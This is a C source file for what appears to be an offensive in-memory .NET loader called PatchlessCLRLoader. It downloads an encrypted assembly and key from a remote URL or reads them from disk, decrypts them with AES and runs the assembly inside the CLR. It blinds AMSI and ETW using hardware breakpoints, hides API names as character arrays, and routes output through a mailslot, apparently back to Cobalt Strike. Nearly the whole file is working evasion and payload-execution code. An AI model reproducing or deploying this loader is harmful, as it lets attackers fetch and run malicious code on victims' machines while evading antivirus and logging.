#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include "PatchlessCLRLoader.h"
#include "breakpoint.h"

#pragma comment(lib, "mscoree.lib")

#pragma warning( disable:4996 )
#define DEFAULT_BUFLEN 4096


BOOL GetPEfromRemote(char* filepath, char** Data, long long* DataSize)
{
	char* remotepath = filepath;
	char* domain = strtok(remotepath, "://");
	domain = strtok(NULL, "://");
	char* path = strtok(NULL, "/");
	char mod[] = { 'W', 'i', 'n', 'i', 'n', 'e', 't','.','d', 'l', 'l', 0 };
	HINSTANCE hinst = LoadLibraryA(mod);
	if (hinst == NULL)
	{
		fprintf(stderr, "[-] Failed to load requried library\n");
		return FALSE;
	}
	char function6[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'l', 'o', 's', 'e','H', 'a', 'n', 'd', 'l', 'e', 0 };
	_sIntCloseHandle fintCloseHandle = (_sIntCloseHandle)GetProcAddress(GetModuleHandleA(mod), function6);

	char function[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'A',0 };
	_sIntOpenA fintOpenA = (_sIntOpenA)GetProcAddress(GetModuleHandleA(mod), function);
	HINTERNET hInternet = fintOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) {
		fprintf(stderr, "[-] Error opening internet\n");
		return FALSE;
	}
	char function1[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'C', 'o', 'n', 'n', 'e', 'c', 't', 'A', 0 };
	_sIntConnectA fintConnectA = (_sIntConnectA)GetProcAddress(GetModuleHandleA(mod), function1);
	HINTERNET hConnect = fintConnectA(hInternet, domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		fprintf(stderr, "[-] Error getting handle of the connection\n");
		fintCloseHandle(hInternet);
		return FALSE;
	}
	char function2[] = { 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 'A', 0 };
	_sHttpOpRequestA fHttpOpReqA = (_sHttpOpRequestA)GetProcAddress(GetModuleHandleA(mod), function2);
	HINTERNET hRequest = fHttpOpReqA(hConnect, "GET", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
	if (!hRequest) {
		fprintf(stderr, "[-] Error opening request\n");
		fintCloseHandle(hConnect);
		fintCloseHandle(hInternet);
		return FALSE;
	}
	char function4[] = { 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 'A', 0 };
	_sHttpSdRequestA fHttpSdReqA = (_sHttpSdRequestA)GetProcAddress(GetModuleHandleA(mod), function4);
	if (!fHttpSdReqA(hRequest, NULL, 0, NULL, 0)) {
		fprintf(stderr, "[-] Error sending request\n");
		fintCloseHandle(hRequest);
		fintCloseHandle(hConnect);
		fintCloseHandle(hInternet);
		return FALSE;
	}
	BYTE buffer[4096];
	DWORD bytesRead;
	DWORD totalBytesRead = 0;
	*Data = NULL;
	int totalsize = 0;
	char function5[] = { 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e',0 };
	_sIntReadFile IntReadFile = (_sIntReadFile)GetProcAddress(GetModuleHandleA(mod), function5);
	while (IntReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
		totalBytesRead += bytesRead;
		BYTE* newData = (BYTE*)realloc(*Data, totalBytesRead);
		if (newData == NULL) {
			fprintf(stderr, "[-] Error allocating\n");
			free(*Data);
			fintCloseHandle(hRequest);
			fintCloseHandle(hConnect);
			fintCloseHandle(hInternet);
		}
		*Data = newData;
		memcpy(*Data + totalsize, buffer, bytesRead);
		totalsize += bytesRead;
	}
	*DataSize = totalsize;
	fintCloseHandle(hRequest);
	fintCloseHandle(hConnect);
	fintCloseHandle(hInternet);
}



void DecryptAES(char* assemblyBytes, size_t assemblyByteLen, char* key, size_t keyLen) {
	
	char admod[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', 0 };	
	HINSTANCE hinst = LoadLibraryA(admod);	
	if (hinst == NULL)
	{
		fprintf(stderr, "[-] Failed to load requried library\n");
		return;
	}
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;	

	char fcacw[] = { 'C', 'r', 'y', 'p', 't', 'A', 'c', 'q', 'u', 'i', 'r', 'e', 'C', 'o', 'n', 't', 'e', 'x', 't', 'W', 0 };
	_CryptAcquireContextW CryptAcquireContextW = (_CryptAcquireContextW)GetProcAddress(GetModuleHandleA(admod), fcacw);

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
		return;
	}
	char fcch[] = { 'C', 'r', 'y', 'p', 't', 'C', 'r', 'e', 'a', 't', 'e', 'H', 'a', 's', 'h', 0 };
	_CryCreateHash CryCreateHash = (_CryCreateHash)GetProcAddress(GetModuleHandleA(admod), fcch);
	if (!CryCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		printf("Failed in CreateHash (%u)\n", GetLastError());
		return;
	}
	char fchd[] = { 'C', 'r', 'y', 'p', 't', 'H', 'a', 's', 'h', 'D', 'a', 't', 'a', 0 };
	_CryptHashData CryptHashData = (_CryptHashData)GetProcAddress(GetModuleHandleA(admod), fchd);
	if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
		printf("Failed in CryptHashData (%u)\n", GetLastError());
		return;
	}
	char fcdk[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 'r', 'i', 'v', 'e', 'K', 'e', 'y', 0};
	_CryptDeriveKey CryptDeriveKey = (_CryptDeriveKey)GetProcAddress(GetModuleHandleA(admod), fcdk);
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
		return;
	}
	char fcd[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't', 0 };
	_CryptDecrypt CryptDecrypt = (_CryptDecrypt)GetProcAddress(GetModuleHandleA(admod), fcd);
	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)assemblyBytes, &assemblyByteLen)) {
		printf("Failed in CryptDecrypt (%u)\n", GetLastError());
		return;
	}
	char fcrc[] = { 'C', 'r', 'y', 'p', 't', 'R', 'e', 'l', 'e', 'a', 's', 'e','C', 'o', 'n', 't', 'e', 'x', 't', 0};
	_CryptReleaseContext CryptReleaseContext = (_CryptReleaseContext)GetProcAddress(GetModuleHandleA(admod), fcrc);
	char fcdh[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y','H', 'a', 's', 'h', 0 };
	_CryDestroyHash CryDestroyHash = (_CryDestroyHash)GetProcAddress(GetModuleHandleA(admod), fcdh);
	char fcdkey[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y','K', 'e', 'y', 0 };
	_CryptDestroyKey CryptDestroyKey = (_CryptDestroyKey)GetProcAddress(GetModuleHandleA(admod), fcdkey);
	CryptReleaseContext(hProv, 0);
	CryDestroyHash(hHash);
	CryptDestroyKey(hKey);
}


BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
	*mailHandle = CreateMailslotA(lpszSlotName,
		0,                             //No maximum message size 
		MAILSLOT_WAIT_FOREVER,         //No time-out for operations 
		(LPSECURITY_ATTRIBUTES)NULL);  //Default security

	if (*mailHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*Read Mailslot*/
BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
	DWORD cbMessage = 0;
	DWORD cMessage = 0;
	DWORD cbRead = 0;
	BOOL fResult;
	LPSTR lpszBuffer = NULL;
	size_t size = 65535;
	char* achID = (char*)MALLOC(size);
	memset(achID, 0, size);
	DWORD cAllMessages = 0;
	HANDLE hEvent;
	OVERLAPPED ov;

	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	if (NULL == hEvent)
		return FALSE;
	ov.Offset = 0;
	ov.OffsetHigh = 0;
	ov.hEvent = hEvent;

	fResult = GetMailslotInfo(*mailHandle, //Mailslot handle 
		(LPDWORD)NULL,               //No maximum message size 
		&cbMessage,                  //Size of next message 
		&cMessage,                   //Number of messages 
		(LPDWORD)NULL);              //No read time-out 

	if (!fResult)
	{
		return FALSE;
	}

	if (cbMessage == MAILSLOT_NO_MESSAGE)
	{
		return TRUE;
	}

	cAllMessages = cMessage;
	while (cMessage != 0)  //Get all messages
	{
		//Allocate memory for the message. 
		lpszBuffer = (LPSTR)GlobalAlloc(GPTR, lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
		if (NULL == lpszBuffer)
			return FALSE;
		lpszBuffer[0] = '\0';

		fResult = ReadFile(*mailHandle,
			lpszBuffer,
			cbMessage,
			&cbRead,
			&ov);

		if (!fResult)
		{
			GlobalFree((HGLOBAL)lpszBuffer);
			return FALSE;
		}

		//Copy mailslot output to returnData buffer
		_snprintf(output + strlen(output), strlen(lpszBuffer) + 1, "%s", lpszBuffer);

		fResult = GetMailslotInfo(*mailHandle,  //Mailslot handle 
			(LPDWORD)NULL,               //No maximum message size 
			&cbMessage,                  //Size of next message 
			&cMessage,                   //Number of messages 
			(LPDWORD)NULL);              //No read time-out 

		if (!fResult)
		{
			return FALSE;
		}


	}
	

	cbMessage = 0;
	GlobalFree((HGLOBAL)lpszBuffer);
	char fch[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	char k32mod[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3','2','.', 'd', 'l', 'l', 0 };
	_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA(k32mod), fch);
	CloseHandle(hEvent);
	return TRUE;
}

/*Determine if .NET assembly is v4 or v2*/
BOOL FindVersion(void* assembly, int length) {
	char* assembly_c;
	assembly_c = (char*)assembly;
	char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (v4[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return 1;
				}
			}
		}
	}

	return 0;
}

/*Start CLR*/
static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost** ppClrMetaHost, ICLRRuntimeInfo** ppClrRuntimeInfo, ICorRuntimeHost** ppICorRuntimeHost) {

	//Declare variables
	HRESULT hr = NULL;

	//Get the CLRMetaHost that tells us about .NET on this machine
	hr = CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

	if (hr == S_OK)
	{
		//Get the runtime information for the particular version of .NET
		hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
		if (hr == S_OK)
		{
			/*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
			loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
			BOOL fLoadable;
			hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
			if ((hr == S_OK) && fLoadable)
			{
				//Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
				hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
				if (hr == S_OK)
				{
					//Start it. This is okay to call even if the CLR is already running
					(*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
				}
				else
				{
					//If CLR fails to load fail gracefully
					printf("[-] Process refusing to get interface of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
					return 0;
				}
			}
			else
			{
				//If CLR fails to load fail gracefully
				printf("[-] Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
				return 0;
			}
		}
		else
		{
			//If CLR fails to load fail gracefully
			printf("[-] The assembly is not correctly loaded. Please check your decryption key, \n[-] Or the Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
			return 0;
		}
	}
	else
	{
		//If CLR fails to load fail gracefully
		printf("[-] The assembly is not correctly loaded. Please check your decryption key, \n[-] Or the Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
		return 0;
	}

	//CLR loaded successfully
	return 1;
}

void Usage(char* lpProgram) {
	printf("Usage:\n");
	printf("\t%s <payload> <key> <arguments>\n", lpProgram);
}

int main(int argc, char **argv){
	char* appDomain = "nothinghere";
	char* assemblyArguments = " ";
	char* fileName = "";
	char* key = "";
	char* keybytes = "";
	size_t keysize = 0;
	BOOL amsi = 1;
	BOOL etw = 1;
	BOOL local = 0;
	ULONG entryPoint = 1;
	char* assemblyBytes = NULL;
	size_t assemblyByteLen = 0;	
	char* slotName = "nothinghere";

	if (argc < 3) {
		Usage(argv[0]);
		return 0;
	}
	else {
		fileName = argv[1];	
		if (strncmp(fileName, "http", 4) == 0)
		{
			local = 1;
		}
		printf("[+] Loading file %s\n", fileName);
		key = argv[2];
		keysize = strlen(key);
		printf("[+] Loading key %s\n", key);

		if (argv[3] != NULL)
		{
			assemblyArguments = argv[3];
			printf("[+] Arguments: %s\n" , assemblyArguments);

		}			
	}
	if (local == 0)
	{
		FILE* fp = fopen(fileName, "rb");
		if (fp != NULL)
		{
			fseek(fp, 0, SEEK_END);
			assemblyByteLen = ftell(fp);
			fseek(fp, 0, SEEK_SET);
			assemblyBytes = (char*)malloc(assemblyByteLen);
			fread(assemblyBytes, assemblyByteLen, 1, fp);
			DecryptAES(assemblyBytes, assemblyByteLen, key, keysize);
		}
		else
		{
			printf("[-] Failed to read file: %s\n", fileName);
			return;
		}
	}
	else
	{
		
		if (!GetPEfromRemote(fileName, &assemblyBytes, &assemblyByteLen))
		{
			printf("[-] Failed to get payload from target");
			return;
		}
		if (!GetPEfromRemote(key, &keybytes, &keysize))
		{
			printf("[-] Failed to get key from target");
			return;
		}

		DecryptAES(assemblyBytes, assemblyByteLen, keybytes, keysize);
	}
	

	//Create mailslot names	
	SIZE_T slotNameLen = strlen(slotName);
	char* slotPath = malloc(slotNameLen + 14);
	memset(slotPath, 0, slotNameLen + 14);
	memcpy(slotPath, "\\\\.\\mailslot\\", 13);
	memcpy(slotPath + 13, slotName, slotNameLen + 1);
	//Declare other variables
	HRESULT hr = NULL;
	ICLRMetaHost* pClrMetaHost = NULL;//done
	ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
	ICorRuntimeHost* pICorRuntimeHost = NULL;
	IUnknown* pAppDomainThunk = NULL;
	AppDomain* pAppDomain = NULL;
	Assembly* pAssembly = NULL;
	MethodInfo* pMethodInfo = NULL;
	VARIANT vtPsa = { 0 };
	SAFEARRAYBOUND rgsabound[1] = { 0 };
	wchar_t* wAssemblyArguments = NULL;
	wchar_t* wAppDomain = NULL;
	wchar_t* wNetVersion = NULL;
	LPWSTR* argumentsArray = NULL;
	int argumentCount = 0;
	HANDLE stdOutput;
	HANDLE mainHandle;
	HANDLE hFile;
	size_t wideSize = 0;
	size_t wideSize2 = 0;
	BOOL success = 1;
	size_t size = 65535;
	char* returnData = (char*)MALLOC(size);
	memset(returnData, 0, size);



	//Determine .NET assemblie version
	if (FindVersion((void*)assemblyBytes, assemblyByteLen))
	{
		wNetVersion = L"v4.0.30319";
	}
	else
	{
		wNetVersion = L"v2.0.50727";
	}

	//Convert assemblyArguments to wide string wAssemblyArguments to pass to loaded .NET assmebly
	size_t convertedChars = 0;
	wideSize = strlen(assemblyArguments) + 1;
	wAssemblyArguments = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
	mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);

	//Convert appDomain to wide string wAppDomain to pass to CreateDomain
	size_t convertedChars2 = 0;
	wideSize2 = strlen(appDomain) + 1;
	wAppDomain = (wchar_t*)malloc(wideSize2 * sizeof(wchar_t));
	mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);

	//Get an array of arguments so arugements can be passed to .NET assembly
	argumentsArray = CommandLineToArgvW(wAssemblyArguments, &argumentCount);

	//Create an array of strings that will be used to hold our arguments -> needed for Main(String[] args)
	vtPsa.vt = (VT_ARRAY | VT_BSTR);
	vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

	for (long i = 0; i < argumentCount; i++)
	{
		//Insert the string from argumentsArray[i] into the safearray
		SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argumentsArray[i]));
	}


	/// <breakpoint>
	printf("[+] Setting up breakpoint for bypass!\n");
	const PVOID handler = hardware_engine_init();
	if (handler == NULL)
	{
		printf("[-] Failed to setup breakpoint! Abort.\n");
		return 0;
	}
	char ntdmod[] = { 'n', 't', 'd', 'l', 'l', '.', 'd','l','l', 0 };


	char fntc[] = { 'N', 't', 'T', 'r', 'a', 'c', 'e', 'C', 'o', 'n', 't', 'r', 'o','l', 0 };
	uintptr_t etwPatchAddr = (uintptr_t)GetProcAddress(GetModuleHandleA(ntdmod), fntc);
	insert_descriptor_entry(etwPatchAddr, 0, rip_ret_patch, GetCurrentThreadId());
	//printf("GetCurrentThreadId: %lu\n", GetCurrentThreadId());
	//printf("etwPatchAddr: %u\n", etwPatchAddr);


	//Start CLR
	printf("[+] Start loading assembly! Please wait for the ouput.\n");
	success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);

	//If starting CLR fails exit gracefully
	if (success != 1) {
		return;
	}	

	//Create Mailslot
	success = MakeSlot(slotPath, &mainHandle);

	char k32mod[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3','2','.', 'd', 'l', 'l', 0 };
	//Get a handle to our pipe or mailslot
	char fcfa[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0 };
	_CreateFileA CreateFileA = (_CreateFileA)GetProcAddress(GetModuleHandleA(k32mod), fcfa);
	hFile = CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

	char fgsh[] = { 'G', 'e', 't', 'S', 't', 'd', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	//Get current stdout handle so we can revert stdout after we finish
	_GetStdHandle GetStdHandle = (_GetStdHandle)GetProcAddress(GetModuleHandleA(k32mod), fgsh);
	stdOutput = GetStdHandle(((DWORD)-11));

	//Set stdout to our newly created named pipe or mail slot
	char fssh[] = { 'S', 'e', 't', 'S', 't', 'd', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	_SetStdHandle SetStdHandle = (_SetStdHandle)GetProcAddress(GetModuleHandleA(k32mod), fssh);
	success = SetStdHandle(((DWORD)-11), hFile);
	
	//Create our AppDomain
	hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
	hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);
	
	char ammod[] = { 'a', 'm', 's', 'i', '.', 'd', 'l','l', 0 };
	char fasb[] = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f','e', 'r', 0};

	HINSTANCE hinst = LoadLibraryA(ammod);
	uintptr_t amsiPatchAddr = (uintptr_t)GetProcAddress(GetModuleHandleA(ammod), fasb);
	insert_descriptor_entry(amsiPatchAddr, 1, rip_ret_patch, GetCurrentThreadId());
	//printf("GetCurrentThreadId: %lu\n", GetCurrentThreadId());
	//printf("amsiPatchAddr: %u\n", amsiPatchAddr);

	//Prep SafeArray 
	rgsabound[0].cElements = assemblyByteLen;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);

	//Copy our assembly bytes to pvData
	memcpy(pvData, assemblyBytes, assemblyByteLen);

	hr = SafeArrayUnaccessData(pSafeArray);

	//Prep AppDomain and EntryPoint
	hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
	if (hr != S_OK) {
		//If AppDomain fails to load fail gracefully
		printf("[-] Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
		return;
	}

	hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
	if (hr != S_OK) {
		//If EntryPoint fails to load fail gracefully
		printf("[-] Process refusing to find entry point of assembly.\n");
		return;
	}
	
	VARIANT retVal;
	ZeroMemory(&retVal, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;

	//Change cElement to the number of Main arguments
	SAFEARRAY* psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);//Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

	//Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
	long idx[1] = { 0 };
	SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);
	
	//Invoke our .NET Method
	hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);


	//Read from our mailslot

	success = ReadSlot(returnData, &mainHandle);	


	//Send .NET assembly output back to CS
	printf("\n\n%s\n", returnData);
	

	//Close handles
	char fch[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
	_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA(k32mod), fch);
	CloseHandle(mainHandle);
	CloseHandle(hFile);

	//Revert stdout back to original handles
	success = SetStdHandle(((DWORD)-11), stdOutput);

	//Clean up
	
	delete_descriptor_entry(etwPatchAddr, GetCurrentThreadId());
	delete_descriptor_entry(amsiPatchAddr, GetCurrentThreadId());
	//getchar();
	SafeArrayDestroy(pSafeArray);
	VariantClear(&retVal);
	VariantClear(&obj);
	VariantClear(&vtPsa);

	if (NULL != psaStaticMethodArgs) {
		SafeArrayDestroy(psaStaticMethodArgs);

		psaStaticMethodArgs = NULL;
	}
	if (pMethodInfo != NULL) {

		pMethodInfo->lpVtbl->Release(pMethodInfo);
		pMethodInfo = NULL;
	}
	if (pAssembly != NULL) {

		pAssembly->lpVtbl->Release(pAssembly);
		pAssembly = NULL;
	}
	if (pAppDomain != NULL) {

		pAppDomain->lpVtbl->Release(pAppDomain);
		pAppDomain = NULL;
	}
	if (pAppDomainThunk != NULL) {

		pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
	}
	if (pICorRuntimeHost != NULL)
	{
		(pICorRuntimeHost)->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
		(pICorRuntimeHost) = NULL;
	}
	if (pClrRuntimeInfo != NULL)
	{
		(pClrRuntimeInfo)->lpVtbl->Release(pClrRuntimeInfo);
		(pClrRuntimeInfo) = NULL;
	}
	if (pClrMetaHost != NULL)
	{
		(pClrMetaHost)->lpVtbl->Release(pClrMetaHost);
		(pClrMetaHost) = NULL;
	}
	printf("[+] Cleaned up the breakpoint and CLR created.\n");
}
